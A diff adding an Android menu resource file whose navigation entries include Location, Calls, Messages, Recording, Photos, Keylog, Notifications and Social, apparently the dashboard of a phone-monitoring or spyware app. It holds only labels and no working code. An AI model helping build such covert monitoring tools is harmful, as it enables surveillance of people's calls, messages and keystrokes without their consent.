@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="utf-8"?>
+<menu xmlns:android="http://schemas.android.com/apk/res/android">
+    <item
+        android:id="@+id/nav_location"
+        android:title="Location" />
+    <item
+        android:id="@+id/nav_calls"
+        android:title="Calls" />
+    <item
+        android:id="@+id/nav_messages"
+        android:title="Messages" />
+    <item
+        android:id="@+id/nav_recording"
+        android:title="Recording" />
+    <item
+        android:id="@+id/nav_photos"
+        android:title="Photos" />
+    <item
+        android:id="@+id/nav_keylog"
+        android:title="Keylog" />
+    <item
+        android:id="@+id/nav_notifications"
+        android:title="Notifications" />
+    <item
+        android:id="@+id/nav_social"
+        android:title="Social" />
+    <item
+        android:id="@+id/nav_settings"
+        android:title="Settings" />
+</menu>
